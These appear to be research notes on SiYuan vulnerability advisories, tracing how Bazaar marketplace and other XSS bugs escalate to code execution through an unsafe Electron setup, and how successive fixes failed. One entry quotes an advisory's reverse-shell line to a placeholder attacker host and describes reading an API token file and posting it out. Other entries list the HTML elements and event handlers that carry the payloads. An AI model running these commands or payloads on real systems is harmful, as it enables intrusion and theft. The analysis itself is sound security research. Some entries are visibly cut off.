CVE-2026-33066.reporter: 0xkakash1 — a FOURTH independent reporter against this app, distinct from ngocnn97, @hypnguyen1209 and Yunkaiwjs
CVE-2026-33066.privilege_config_verbatim: app/electron/main.js:422-426 — nodeIntegration: true, contextIsolation: false. Advisory: 'Any JavaScript executing in the renderer has direct access to Node.js APIs.'
CVE-2026-33066.backend_sink_verbatim: kernel/bazaar/package.go:635-645, renderREADME(): 'luteEngine := lute.New()  // Fresh Lute instance — SetSanitize NOT called' ... 'ret = luteEngine.Md2HTML(string(mdData))  // Raw HTML in Markdown is PRESERVED'.
CVE-2026-33066.frontend_sink_verbatim: app/src/config/bazaar.ts:607 — 'mdElement.innerHTML = response.data.html;  // Unsanitized HTML injected into DOM'. The advisory notes there is no client-side DOMPurify either.
CVE-2026-33066.escalation_primitive: (viii) NON-UNIFORM APPLICATION OF A SANITIZER API ACROSS SIBLING CALL SITES OF THE SAME LIBRARY. The advisory makes this explicit and it is the single most citable line in it: SiYuan's own note renderer at kernel/util/lute.go:81 DOES call luteEngine.SetSanitize(true), while renderREADME() does not — 'This inconsistency demonstrates that the project is aware of the Lute sanitization API but failed to apply it to Bazaar content.' STRUCTURALLY IDENTICAL to the escapeAriaLabel-vs-escapeAttr divergence in CVE-2026-50551. TWO INDEPENDENT INSTANCES OF THE SAME META-PATTERN IN ONE APPLICATION, four months apart, in different languages (Go backend vs TypeScript frontend). This upgrades the 08-30 claim from an observation to a repeated, cross-layer property: a discovery tool can enumerate every construction site of a renderer/escaper and flag the ones whose configuration DIVERGES from the majority, with no need to model the sink semantics at all.
CVE-2026-33066.delivery_supply_chain: Delivery is the OFFICIAL SiYuan Bazaar community marketplace: the attacker publishes a plausible plugin/theme/template repo whose README.md carries the payload, submits it through the normal contribution process, and the victim is compromised by clicking the listing to view details. This is the FIRST advisory in this corpus where the delivery channel is a first-party package marketplace — it links the Electron XSS->RCE thread to the config's npm/supply-chain include category without going through npm itself.
CVE-2026-33066.payload_carriers_named: img/onerror, svg/onload, details/ontoggle with the open attribute (fires immediately, no interaction with the element), picture, video, audio, iframe, object, embed, math. The advisory also sketches an onload-based multi-stage payload that exfiltrates the SiYuan API token, config, hostname, username and platform, then installs Windows scheduled-task / Linux crontab persistence.
CVE-2026-33066.click_profile_note: Advisory verbatim: 'This vector requires one click (user viewing the package README), unlike the metadata vector which is zero-click.' The zero-click sibling is the Bazaar Package Metadata advisory, GHSA-mvpm-v6q4-m2pf — OPENED AND READ IN FULL ON 2026-09-01, recorded below as CVE-2026-33067. The pair is now fully grounded on both sides: same reporter (0xkakash1), same publication date (17 Mar 2026), same parent report (GHSA-v3mg-9v85-fcm7), same patched version (v3.6.1), same renderer profile — differing only in which manifest field carries the payload and therefore in UI:R vs UI:N.
CVE-2026-33066.vendor_recommended_fix_verbatim: Three-part: (1) add luteEngine.SetSanitize(true) in renderREADME; (2) DOMPurify.sanitize() at the innerHTML assignment as defence in depth; (3) 'Long-term: Harden Electron configuration' — nodeIntegration: false, contextIsolation: true, sandbox: true. CVE-2026-29183.title_verbatim: Unauthenticated reflected SVG XSS in `/api/icon/getDynamicIcon` (`type=8`) enables arbitrary JavaScript execution
CVE-2026-29183.mechanism_summary: GET /api/icon/getDynamicIcon with type=8 embeds attacker-controlled content into the SVG output without escaping. The endpoint is UNAUTHENTICATED and returns image/svg+xml, so a crafted URL injects executable SVG/HTML event handlers and runs JavaScript in the SiYuan web origin; from there it can drive authenticated API actions and exfiltrate data when a logged-in user opens the link.
CVE-2026-29183.WHY_THIS_ONE_IS_DIFFERENT: IT DOES NOT CLAIM RCE. Same application, same CWE-79, same year, and yet the advisory stops at JavaScript execution plus authenticated API abuse — the escalation to child_process is never asserted, and the vector carries A:N (no availability impact) rather than the A:H that every XSS->RCE advisory in this corpus carries. THIS IS THE MOST USEFUL THING IN THE ENTRY: it is a within-application control case showing that the vendor DOES distinguish XSS-only from XSS->RCE when scoring, which means the 9.9/9.6/9.0 RCE scores elsewhere are not simply this vendor inflating every XSS. It also sharpens the severity-comparability warning — a corpus-wide aggregation of 'SiYuan XSS CVSS' would silently mix an XSS-only 9.3 with RCE 9.6s.
CVE-2026-29183.source_surface_note: Source is a URL query parameter on an unauthenticated HTTP endpoint (PR:N, reflected), not stored content and not a deep link. That makes it the third distinct source class recorded for this app: stored note/AV content (-50551, -39846), the siyuan:// custom-protocol deep link (GHSA-6gx2-8gcr-x83f), and now the app's own unauthenticated local HTTP API. A discovery tool scoped only to renderer DOM sinks or only to IPC would miss this one entirely.

CVE-2026-33067.sink_verbatim:
app/src/config/bazaar.ts:275-277. Two fields on one card. Package name: '${item.preferredName}${item.preferredName !== item.name ? ` ${item.name}` : ""}' — 'Package name injected directly — NO escaping'. Description: '

CVE-2026-33067.privilege_config_verbatim: app/electron/main.js:422-426 — nodeIntegration: true, contextIsolation: false. Advisory: 'any JavaScript executing in the renderer process has direct access to Node.js APIs including require(\'child_process\'), require(\'fs\'), and require(\'os\').' NOTE: same line range as CVE-2026-33066 cites, and DIFFERENT from the ranges cited by CVE-2026-50551 (main.js:307) and CVE-2026-44588 (main.js:407-411) — four advisories, three line ranges, one profile. Reinforces that line-anchored detection of this profile is fragile and pattern-anchored detection is not.
CVE-2026-33067.escalation_primitive: (viii) NON-UNIFORM APPLICATION OF A SANITIZER ACROSS SIBLING CALL SITES — THIRD INDEPENDENT INSTANCE, and the tightest one yet. Here the divergence is not across files or languages but across TWO EXPRESSIONS IN ONE HTML TEMPLATE, ~2 lines apart: the title ATTRIBUTE of the description div is escaped with escapeAttr(), while the TEXT CONTENT of the same div, carrying the same variable, is not. Advisory verbatim: 'The inconsistency is notable: the title attribute is escaped via escapeAttr(), but the actual rendered text content is not — indicating the risk was partially recognized but incompletely mitigated.' Prior instances: escapeAriaLabel-vs-escapeAttr across sibling renderers (CVE-2026-50551), lute.New()-vs-SetSanitize(true) across Go call sites (CVE-2026-33066). THESIS VALUE: the meta-pattern now holds at three different granularities — across languages, across files, and within a single template literal. A checker that flags divergent sanitizer choice on one variable within one render function needs no taint analysis, no sink semantics and no Electron model, and would have caught this instance.
CVE-2026-33067.zero_click_verbatim: 'When any SiYuan desktop user navigates to Settings > Bazaar > Plugins, the package listing renders the malicious displayName. The tag fails to load, firing the onerror handler... No click is required. The payload executes the moment the Bazaar page loads and the package card is rendered in the DOM.' And: 'The user does not need to install, click, or interact with the malicious package in any way. Browsing the marketplace is sufficient.' This is the corpus's SECOND UI:N advisory (after CVE-2026-50551) and the first where UI:N is achieved through a supply-chain channel rather than through synced content.
CVE-2026-33067.delivery_supply_chain: plugin.json manifest field displayName.default, submitted to the official SiYuan Bazaar index repository via the standard community pull-request process. PoC payload verbatim: 'Helpful Plugin'. Escalations given in full: reverse shell via 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'; API-token exfiltration reading ~/.config/siyuan/cookie.key with require('fs').readFileSync and posting it to an attacker host; and a Windows silent-persistence variant (header present, body truncated in the rendered page). Impact section states it 'targets the entire SiYuan user community via the official marketplace' and 'Affects all platforms: Windows, macOS, Linux'.
CVE-2026-33067.vendor_recommended_fix_verbatim: Three-part, and the middle part is new for this corpus: (1) escapeHtml() applied to ALL user-controlled metadata in bazaar.ts; (2) SERVER-SIDE sanitization in the Bazaar index build pipeline, with a concrete Go function sanitizePackageDisplayStrings() html.EscapeString-ing every DisplayName and Description value 'so malicious content never reaches clients'; (3) 'Long-term: Harden Electron configuration' — nodeIntegration: false, contextIsolation: true, sandbox: true. Item (2) is the first advisory in this corpus to propose fixing an Electron client-side XSS at the PACKAGE-INDEX level, i.e. treating the marketplace as the trust boundary. Item (3) is, for the fourth time, the same secure baseline recommended and not adopted.

CVE-2026-40922.title_verbatim: Incomplete fix for CVE-2026-33066: XSS in github.com/siyuan-note/siyuan
CVE-2026-40922.severity: Moderate / Medium (no CVSS vector published on the advisory page)
CVE-2026-40922.why_this_is_the_run_headline: IT IS A THIRD INCOMPLETE FIX, AND IT ESTABLISHES A SECOND FULL CHAIN ON A DIFFERENT SURFACE. Prior to this run the repo held ONE documented XSS incomplete-fix chain (aria-label: CVE-2026-34585 -> CVE-2026-44588 -> CVE-2026-50551) plus a path-traversal chain. This advisory opens a second XSS chain on the Bazaar README surface: CVE-2026-33066 -> CVE-2026-40922. Crucially it is a DIFFERENT FAILURE MODE from the other two. -33066 failed because a sanitizer was never called; -50551 failed because the correct sanitizer was applied non-uniformly; -40922 failed because the sanitizer WAS called, uniformly, and was itself inadequate. Three successive layers of sink-level remediation — not applied, applied inconsistently, applied but insufficient — all in one application, all documented by the vendor. This is the strongest empirical statement the repo can make against the objection that hardening sinks is a sufficient substitute for auditing the webPreferences profile.

The advisory explains both: the first 'passes through because iframe is not blocked and the srcdoc value is raw HTML (not a URL scheme)'; the second 'also passes because the event handler is inside the srcdoc string value, not a top-level tag attribute'. Mechanism: 'The browser renders srcdoc HTML in a nested browsing context, executing embedded scripts and event handlers.'
CVE-2026-40922.impact_verbatim: 'A malicious bazaar package author can include <iframe srcdoc=\'<script>...</script>\'> in their README.md. When other users view the package in SiYuan's marketplace UI, the XSS executes in the Electron context with full application privileges, enabling data theft, local file access, and arbitrary code execution on the user's machine.' NOTE THE SCORING TENSION, and record it rather than resolve it: this advisory asserts arbitrary code execution on the host yet is rated Moderate/Medium with no CVSS vector, while its own parent -33066 — same surface, same delivery, same Electron context, one click — is rated Critical 9.6. That is a SEVENTH inconsistency for the cross-app severity-comparability warning, and this time it is INTERNAL TO A SINGLE CHAIN, which is the sharpest form of the argument: an aggregation keyed on CVSS would rank the incomplete fix as less serious than the bug it failed to fix.
CVE-2026-40922.component_discrepancy_RESOLVED_2026-09-0: THE b382f50 DIFF WAS READ THIS RUN AND THE DISCREPANCY IS CLOSED. Commit b382f50e1880ed996364509de5a10a72d7409428, authored by 88250, commit message '\ud83d\udd12 GHSA-v3mg-9v85-fcm7' (i.e. tagged with the PARENT advisory, not with -33066 or -40922), Signed-off-by: Daniel <845765@qq.com>, parent commit 1e370e3. It changes EXACTLY ONE FILE and adds EXACTLY ONE LINE: kernel/bazaar/readme.go, hunk '@@ -109,6 +109,7 @@ func getInstalledPackageREADME(installPath, linkBase string, readme LocaleString'. Context lines 109-111 are 'func renderPackageREADME(linkBase string, mdData []byte) (ret string) {', 'mdData = bytes.TrimPrefix(mdData, []byte("\\xef\\xbb\\xbf")) // \u79fb\u9664\u6587\u4ef6\u5f00\u5934\u7684 BOM', 'luteEngine := lute.New()'; the ADDED line 112 is 'luteEngine.SetSanitize(true)'; following context is SetSoftBreak2HardBreak(false), SetCodeSyntaxHighlight(false), SetLinkBase(linkBase). CONFIRMED SEPARATELY by CVE-2026-54070, whose description states verbatim that 'The renderPackageREADME function in kernel/bazaar/readme.go renders a Bazaar package README from Markdown to HTML with the lute engine and SetSanitize(true)'. CONCLUSION: renderPackageREADME() in kernel/bazaar/readme.go is the live Bazaar README renderer; renderREADME() at kernel/bazaar/package.go:635-645 is the pre-refactor location named by the parent advisory and by -33066. TREAT AS A RENAME/MOVE, NOT TWO LIVE SIBLINGS \u2014 but note this is an inference from two secondary confirmations, not from reading both files; readme.go also contains getInstalledPackageREADME(), so the file holds at least two README functions and only ONE of them was touched by b382f50. NOT VERIFIED: whether package.go:635-645 still exists post-refactor, and whether getInstalledPackageREADME() (the installed-package path, as opposed to the marketplace-listing path) calls a sanitized renderer. That second question is the single cheapest remaining check in this cluster.
CVE-2026-40922.b382f50_significance_2026-09-02: THE ONE-LINE FIX IS ITSELF THE ARGUMENT. The entire remediation for the Bazaar README vector is a single added call, 'luteEngine.SetSanitize(true)' \u2014 exactly the fix the parent advisory GHSA-v3mg-9v85-fcm7 recommended verbatim in its 'Suggested Fix' item 2. That one line was then defeated TWICE: by -40922 (iframe srcdoc bypasses the sanitizer's element/attribute model) and by CVE-2026-54070 (the sanitizer's event-handler blocklist omits modern HTML5 handlers). A thesis can state, with a commit hash and a diff: the vendor implemented the reporter's recommended sink fix exactly as written, and the sink fix was bypassed twice within four months, while app/electron/main.js was not touched.
CVE-2026-40922.vendor_recommended_fix_verbatim: (1) 'Add iframe to the setOfElementsToSkipContent set in the Lute sanitizer.' (2) 'If iframes must be preserved, strip the srcdoc attribute entirely or sanitize its HTML content recursively.' (3) 'Apply a Content Security Policy (CSP) to the README rendering context.' Item (3) is notable against GHSA-6gx2-8gcr-x83f's finding that this app strips content-security-policy from every response at main.js:554-565 and sets --disable-web-security at main.js:87 — the recommended mitigation is one the application's own main process actively disables.

GHSA-v3mg-9v85-fcm7.WHY_THIS_ENTRY_CHANGES_THE_ARGUMENT: IT REVERSES THE REPO'S OWN BAZAAR-CLUSTER FRAMING, AND THE CORRECTED VERSION IS A BETTER FINDING. The 2026-09-01 entry argued that the Bazaar advisories showed per-field, sink-by-sink DISCOVERY, and that 'a discovery method that enumerates every field of an externally-supplied data structure would have found all four in a single pass, whereas the per-report, per-field process that actually occurred produced four advisories across five months.' THE PARENT ADVISORY SHOWS THAT IS WRONG ABOUT DISCOVERY. One reporter, 0xkakash1, filed ONE report on 14 Mar 2026 that already contained BOTH vectors together \u2014 metadata (displayName, description) AND README \u2014 with both sinks, both PoCs and one shared root cause. The reporter DID enumerate the surface in a single pass. What fragmented was the RECORD: the maintainer split this one report into GHSA-4663-4mpg-879v (CVE-2026-33066, README) and GHSA-mvpm-v6q4-m2pf (CVE-2026-33067, metadata) three days later, on 17 Mar 2026, and only the two children received CVE IDs \u2014 the parent still reads 'No known CVE'. THE CORRECTED, STRONGER CLAIM: advisory-record counts are not discovery counts. One discovery event on this surface produced three GHSA records and two CVEs. A thesis that measures 'how many Electron XSS-to-RCE vulnerabilities were found' from CVE or GHSA counts will OVER-COUNT findings, and the over-count is introduced by vendor advisory-splitting practice, not by the research. That is a concrete measurement-validity caveat this repo can state from primary evidence, and it applies to any bibliometric argument the thesis makes from vulnerability databases.

CVE-2026-45375.closes_open_lead: PARTIALLY \u2014 this was priority 2 on the 2026-09-01 list, where it was known ONLY from a GLAD search-result title. It now has a mechanism and file-level root cause, but from a search summary of the GLAD page, NOT from a page read.
CVE-2026-45375.WHY_THIS_IS_THE_RUN_HEADLINE: THE VENDOR ADOPTED THE RECOMMENDED SERVER-SIDE FIX AND SCOPED IT TO THE REPORTED FIELDS RATHER THAN TO THE STRUCT. CVE-2026-33067's advisory recommended, as its item (2), a concrete Go helper 'sanitizePackageDisplayStrings()' that html.EscapeString-s package display strings server-side in the Bazaar index pipeline 'so malicious content never reaches clients'. That helper NOW EXISTS in kernel/bazaar/package.go \u2014 and per this record it 'HTML-escapes only Author, DisplayName, and Description \u2014 Name and Version flow through to the renderer raw.' Author, DisplayName and Description are exactly the fields the earlier advisories named. Name and Version are siblings in the same manifest struct, equally attacker-controlled, and reach the same renderer: the frontend substitutes them at app/src/config/bazaar.ts via ${item.preferredName} / ${data.name} / v${data.version} and assigns to innerHTML. THESIS VALUE, AND IT IS THE SHARPEST ARTICULATION THIS REPO HAS: the remediation's scope was derived from the ADVISORY'S FIELD LIST, not from the DATA STRUCTURE. This is a FIFTH independent instance of escalation primitive (viii) non-uniform sanitizer application, and the first in which the non-uniformity is introduced BY A FIX rather than by pre-existing code. It is the direct empirical warrant for a discovery method that enumerates every field of an externally-supplied struct and checks each field's render path \u2014 a checker doing that would have flagged Name and Version at the moment sanitizePackageDisplayStrings was written.
CVE-2026-45375.privilege_config_reported: app/electron/main.js:407-411 \u2014 nodeIntegration: true, contextIsolation: false, webSecurity: false. SAME LINE RANGE as CVE-2026-44588 cites. Running tally of line ranges for the one unchanged profile: main.js:307 (-50551), main.js:407-411 (-44588, -45375), main.js:422-426 (-33066, -33067, GHSA-v3mg). Three ranges, six advisories, one profile \u2014 line-anchored detection is fragile, pattern-anchored detection is not.
CVE-2026-45375.manifest_files_named: plugin.json and the equivalent theme.json / template.json / widget.json / icon.json. NOTE: widget.json and icon.json are NEW to this repo \u2014 the earlier advisories named only plugin/theme/template. The externally-supplied manifest surface is therefore wider than previously recorded.
CVE-2026-45375.root_cause_family: (A1) unsafe webPreferences profile + concrete sink; member of the Bazaar cluster
CVE-2026-45375.grounding: WEAK \u2014 SEARCH-RESULT SUMMARY OF THE GLAD PAGE ONLY. The GLAD page was NOT fetched; no GHSA page, no NVD entry, no source file was read. Title, the sanitizePackageDisplayStrings field list, the bazaar.ts interpolation expressions and the main.js:407-411 profile all come from that summary. Affected/patched versions, CVSS, CWE, reporter and publication date are NOT KNOWN. Re-verify against the GLAD or GHSA page before quoting anything here, and in particular confirm the Author/DisplayName/Description-only escaping against kernel/bazaar/package.go itself \u2014 that single claim carries the whole argument above.

CVE-2026-54070.title_verbatim_glad: SiYuan: Stored XSS in Bazaar marketplace via package README event handlers
CVE-2026-54070.severity: Reported as High by a secondary tracker (DailyCVE, 'DC-Jul2026-866'). No vector retrieved. Do not assert a score.
CVE-2026-54070.closes_open_lead: PARTIALLY \u2014 priority 2 on the 2026-09-01 list, previously known only from a GLAD search-result title. Mechanism now known from a search summary of the GLAD page; the page itself was NOT read.
CVE-2026-54070.WHY_THIS_MATTERS: IT MAKES THE BAZAAR README SURFACE A THREE-LINK INCOMPLETE-FIX CHAIN, AND EACH LINK FAILS DIFFERENTLY. The surface now reads: CVE-2026-33066 (sanitizer NEVER CALLED) -> CVE-2026-40922 (sanitizer called; <iframe srcdoc> defeats it because the sanitizer's ATTRIBUTE TYPE MODEL is wrong) -> CVE-2026-54070 (sanitizer called; modern HTML5 event handlers defeat it because the EVENT-NAME BLOCKLIST IS STALE). Three successive remediations at one sink, three distinct sanitizer defects, one unchanged webPreferences profile. Combined with the aria-label chain (CVE-2026-34585 -> CVE-2026-44588 -> CVE-2026-50551), SiYuan now exhibits TWO INDEPENDENT THREE-LINK XSS INCOMPLETE-FIX CHAINS in a single year.
CVE-2026-54070.escalation_primitive: (x) SANITIZER EVENT-HANDLER BLOCKLIST STALENESS \u2014 NEW PRIMITIVE, and the most classic sanitizer antipattern in the corpus: enumeration by denylist against an evolving specification. Per the retrieved summary, 'The lute sanitizer uses an event-handler blocklist that omits modern event handlers. onpointerover, onpointerdown, onauxclick, onbeforetoggle, onfocusin, onanimationstart, and ontransitionend are not in the blocklist.' DISTINCT FROM (ix) allowlist gap via nested browsing context (-40922), which is a type-model error, and from (vi)/(vii), which are decode-path and alphabet mismatches. THESIS VALUE: (ix) and (x) are both defects INSIDE a sanitizer that is correctly and uniformly invoked. Any analysis that treats SetSanitize(true) as a sound barrier \u2014 which is what a sanitizer-aware taint tool does \u2014 marks all three README CVEs clean. Detecting (x) needs no dataflow at all: it needs the sanitizer's event-name list diffed against the current HTML/Pointer Events/CSS Animations event registries.
CVE-2026-54070.defence_in_depth_absent_verbatim: 'The frontend assigns the rendered HTML to mdElement.innerHTML with no client-side DOMPurify, into a normal element in the main document (no iframe, no sandbox)' and 'the kernel sends no Content-Security-Policy, X-Frame-Options, or X-Content-Type-Options headers on any response, so an inline handler runs when its event fires.' This INDEPENDENTLY CORROBORATES the header-stripping finding in GHSA-6gx2-8gcr-x83f (main.js:554-565) from a different advisory and a different reporter \u2014 the first cross-advisory confirmation of that claim in this repo. It also sharpens the -40922 irony: that advisory's third recommended fix was 'Apply a Content Security Policy (CSP) to the README rendering context', and this advisory records that the kernel emits no CSP at all.
CVE-2026-54070.impact_framing_note: RECORD, DO NOT RESOLVE: the retrieved impact stops at 'run JavaScript in the Administrator's authenticated SiYuan origin ... and gains full control of the workspace' \u2014 it does NOT assert Electron/Node escalation to OS command execution, even though the same renderer profile and the same sink family are involved as in the Critical 9.6 advisories. This is the SECOND advisory in the corpus to stop short of asserting RCE (after CVE-2026-29183) and an EIGHTH severity/impact-framing inconsistency. Caveat the caveat: this is an argument from ABSENCE in a search summary, the same weakness already flagged for -29183 \u2014 confirm against the advisory body before using it.
CVE-2026-54070.root_cause_family: (A1) unsafe webPreferences profile + concrete sink; THIRD MEMBER of the incomplete-fix sub-family and third link of Bazaar Chain B
CVE-2026-54070.grounding: WEAK \u2014 SEARCH-RESULT SUMMARY OF THE GLAD PAGE ONLY. Neither the GLAD page, the GHSA page, the CVEReports page nor the DailyCVE page was fetched. The seven event-handler names, the renderPackageREADME/readme.go + SetSanitize(true) statement, the no-DOMPurify/no-CSP statements and the 3.7.0 fixed version all come from that summary. Reporter, publication date, CVSS and CWE are NOT KNOWN. The one claim here that IS independently corroborated is that renderPackageREADME in kernel/bazaar/readme.go calls SetSanitize(true) \u2014 confirmed by the b382f50 diff read this run.

context_non_venue.bazaar_cluster_2026-09-01: NEW STRUCTURAL FINDING, and it reframes the recurrence argument. The SiYuan BAZAAR MARKETPLACE surface alone now accounts for FIVE known advisories, four of which are the same defect — attacker-supplied package data rendered into a nodeIntegration:true / contextIsolation:false renderer — rediscovered in different fields of the same data structure: (1) CVE-2026-33066 / GHSA-4663-4mpg-879v, README rendered without SetSanitize; (2) CVE-2026-40922 / GHSA-8q5w-mmxf-48jg, incomplete fix for (1), iframe srcdoc bypasses the enabled sanitizer; (3) CVE-2026-33067 / GHSA-mvpm-v6q4-m2pf, displayName + description metadata unescaped, ZERO-CLICK; (4) CVE-2026-45375, 'name' and 'version' metadata unescaped — NOT OPENED; (5) CVE-2026-54070, 'Stored XSS in Bazaar marketplace via package README event handlers' — NOT OPENED. WHY THIS MATTERS MORE THAN THE RAW COUNT: the repo's existing framing is recurrence over TIME ('fixed at the sink, never at the profile'). This cluster is recurrence over the FIELD SPACE OF ONE STRUCT, at essentially one moment — (1) and (3) were published the same day, 17 Mar 2026, by the same reporter, split from the same parent report GHSA-v3mg-9v85-fcm7. The manifest fields displayName, description, name and version are siblings in one plugin.json, all attacker-controlled, all reaching one render path, and they were fixed one or two at a time. THESIS-USABLE CLAIM: a discovery method that enumerates every field of an externally-supplied data structure and checks each one's render path would have found all four in a single pass, whereas the per-report, per-field process that actually occurred produced four advisories across five months. That is a concrete, measurable argument for structure-aware discovery over sink-by-sink reporting, grounded entirely in vendor-published records. CAVEATS: (4) and (5) are known ONLY from GLAD search-result titles this run — neither advisory page was opened, so their versions, scores and exact sinks are UNVERIFIED and must not be quoted; and the count of five is a floor, since GHSA-v3mg-9v85-fcm7 is still unopened and may name further splits.
context_non_venue.bazaar_cluster_2026-09-02_SUPERSEDES_THE: READ THIS INSTEAD OF bazaar_cluster_2026-09-01. The parent advisory GHSA-v3mg-9v85-fcm7 was opened and read in full this run, and it FALSIFIES the discovery claim made on 09-01 while REPLACING it with a stronger and better-evidenced one. (A) WHAT WAS WRONG. The 09-01 entry argued the cluster showed per-field, sink-by-sink DISCOVERY, and that a struct-enumerating method 'would have found all four in a single pass, whereas the per-report, per-field process that actually occurred produced four advisories across five months.' The parent shows the reporter 0xkakash1 DID find the metadata and README vectors in a single pass, in ONE report dated 14 Mar 2026, complete with both sinks, both PoCs, the shared nodeIntegration root cause AND both instances of the non-uniform-sanitizer observation. The fragmentation happened AFTER discovery: the maintainer split that one report into CVE-2026-33066 and CVE-2026-33067 on 17 Mar 2026, and only the two children got CVE IDs \u2014 the parent still reads 'No known CVE'. (B) THE CORRECTED CLAIM, WHICH IS BETTER. Advisory-record counts are not discovery counts. On this surface, ONE discovery event produced THREE GHSA records and TWO CVEs. Any thesis argument that measures the prevalence or recurrence of Electron XSS-to-RCE from CVE or GHSA counts inherits an over-count generated by vendor advisory-splitting practice. That is a measurement-validity caveat this repo can now state from primary evidence, and it cuts against the repo's OWN prior use of raw advisory counts \u2014 which is exactly why it is worth stating. (C) WHAT SURVIVES, AND IS NOW STRONGER. The struct-enumeration argument does NOT depend on the discovery timeline; it depends on CVE-2026-45375, added this run. The vendor implemented the server-side helper sanitizePackageDisplayStrings() that CVE-2026-33067's advisory recommended, and per the -45375 record it escapes ONLY Author, DisplayName and Description \u2014 precisely the fields prior advisories had named \u2014 while leaving the sibling Name and Version fields of the same manifest struct raw. The REMEDIATION'S SCOPE WAS DERIVED FROM AN ADVISORY'S FIELD LIST RATHER THAN FROM THE DATA STRUCTURE. That is the struct-enumeration argument in its proper place: not a claim about how researchers search, but a documented failure in how a vendor FIXED, and a fifth instance of primitive (viii) \u2014 the first introduced BY a fix. (D) THE CLUSTER AS IT NOW STANDS: SIX known records on the Bazaar surface. (0) GHSA-v3mg-9v85-fcm7, parent, no CVE, metadata + README, patched v3.6.1 \u2014 READ IN FULL. (1) CVE-2026-33066 / GHSA-4663-4mpg-879v, README, split child, v3.6.1 \u2014 READ IN FULL. (2) CVE-2026-33067 / GHSA-mvpm-v6q4-m2pf, displayName + description, split child, ZERO-CLICK, v3.6.1 \u2014 READ IN FULL. (3) CVE-2026-40922 / GHSA-8q5w-mmxf-48jg, incomplete fix of (1), iframe srcdoc, v3.6.4 at commit b382f50 \u2014 READ IN FULL, and the b382f50 DIFF READ THIS RUN. (4) CVE-2026-54070, second incomplete fix of the same sanitizer, stale event-handler blocklist, fixed 3.7.0 \u2014 SEARCH-SUMMARY GROUNDING ONLY. (5) CVE-2026-45375, name + version metadata unescaped by the new server-side helper \u2014 SEARCH-SUMMARY GROUNDING ONLY. Six records, and by the (B) argument they represent FEWER than six independent discoveries \u2014 the exact number is unknown, which is itself the point.
context_non_venue.incomplete_fix_chain_2026-08-31: THE SINGLE BIGGEST STRUCTURAL FINDING OF THIS RUN. The aria-label sink family in SiYuan is now a THREE-LINK incomplete-fix chain, each link named by the next one's own advisory: CVE-2026-34585 -> (incompletely fixed by) CVE-2026-44588 -> (whose escapeAriaLabel fix was applied non-uniformly, producing) CVE-2026-50551. That is one data type, one sink family, three CVEs, and two successive failed remediations, all documented by the vendor rather than inferred by this watch. Separately, GHSA-gw25-m53r-qh88 establishes a SECOND, independent incomplete-fix chain in the same application on a different weakness class (path traversal, incompletely fixing GHSA-6865-qjcf-286f). WHY IT MATTERS: the repo's prior framing was 'fixed at the sink, never at the profile'. The chain shows something stronger and more specific — fixes at the sink do not even reliably hold AT THE SINK. A thesis can use this as the empirical answer to the obvious objection that hardening sinks is a sufficient alternative to auditing the profile.
context_non_venue.why_the_2026-08-30_addition_matters: Adding CVE-2026-50551 changes the ARGUMENT this entry supports, not just its count. Three things it supplies that the previous eight did not. (1) A NAMED MECHANISM FOR THE RECURRENCE. The eight-advisory version of this entry could only assert a pattern ('fixed at the sink, never at the profile'). This advisory states the mechanism in the vendor's own words: the fix for CVE-2026-44588 hardened ONE renderer with escapeAriaLabel() and left the sibling Attribute-View renderers on the weaker escapeAttr(), and it calls this 'a pattern of incomplete fixes' while naming two further instances. The thesis can now argue that sink-level patching fails not merely because sinks are numerous but because a correct fix is applied non-uniformly across renderers sharing one data type — a claim a discovery tool can be built to test (find sinks reachable by the same source where sanitizer choice DIVERGES). (2) A SECOND-ORDER SINK PRIMITIVE THAT DEFEATS NAIVE TAINT ANALYSIS. Sink 2 is not an unsanitized flow — escapeAttr() IS applied, and it IS correct for writing an HTML attribute. The bug is that the value then makes an attribute -> getAttribute() (entity-decoding) -> decodeURIComponent -> innerHTML round-trip, at which point quote-only escaping is insufficient. Any analysis that treats escapeAttr as a sanitizer marks this flow clean. This is the corpus's first sink whose defect is a MISMATCH between a sanitizer and the downstream decode path rather than a missing sanitizer, and it is a concrete, citable gap in sanitizer-aware static analysis. (3) THE FIRST UI:N ADVISORY IN THE CORPUS, AT 9.9. Sink 1 fires on page load, so opening a synced note suffices. Every prior advisory here is UI:R. Combined with the sync-propagation and .sy-file persistence statements, this is the strongest single impact datapoint the repo holds. It also sharpens the severity-inconsistency observation in cross_app_note_v3: the same vulnerability class across this corpus is now scored 9.9 UI:N, 9.6 UI:R, 9.0 UI:R, 8.2 AV:L/PR:L, and Vikunja's bare 'High' with no vector at all.
context_non_venue.incomplete_fix_chains_2026-09-02_SUPERSE: CHAIN B IS NOW THREE LINKS, MATCHING CHAIN A, AND THE THREE-BY-THREE STRUCTURE IS THE STRONGEST FORM OF THE ARGUMENT THIS REPO HOLDS. CHAIN A (aria-label sink family): CVE-2026-34585 -> CVE-2026-44588 -> CVE-2026-50551. CHAIN B (Bazaar README): CVE-2026-33066 -> CVE-2026-40922 -> CVE-2026-54070 (added this run). CHAIN C (path traversal, different weakness class): GHSA-6865-qjcf-286f -> GHSA-gw25-m53r-qh88. TWO INDEPENDENT THREE-LINK XSS INCOMPLETE-FIX CHAINS IN ONE APPLICATION IN ONE YEAR. Chain B is the more citable of the two because its three links isolate three DIFFERENT defects in the SAME sanitizer call, in order of increasing subtlety: (i) SetSanitize is never called (-33066); (ii) SetSanitize is called and its ATTRIBUTE TYPE MODEL is wrong \u2014 srcdoc is tested as a URL though it carries raw HTML, and iframe is commented out of the skip set (-40922); (iii) SetSanitize is called and its EVENT-NAME DENYLIST IS STALE \u2014 onpointerover, onpointerdown, onauxclick, onbeforetoggle, onfocusin, onanimationstart, ontransitionend are absent (-54070). Links (ii) and (iii) are both defects INSIDE a sanitizer that is invoked correctly and uniformly, which is the case sanitizer-aware taint analysis is least equipped for: such a tool treats the SetSanitize(true) call as a sound barrier and marks all three flows clean. THE THESIS SENTENCE THIS SUPPORTS: across three successive remediations at one sink over four months, the escalation was never closed, because the defect migrated from the CALL SITE into the SANITIZER'S OWN MODEL of HTML \u2014 while app/electron/main.js kept nodeIntegration: true and contextIsolation: false throughout. Sink-level patching is not merely incomplete; on this surface it is a moving target with the profile as the constant.
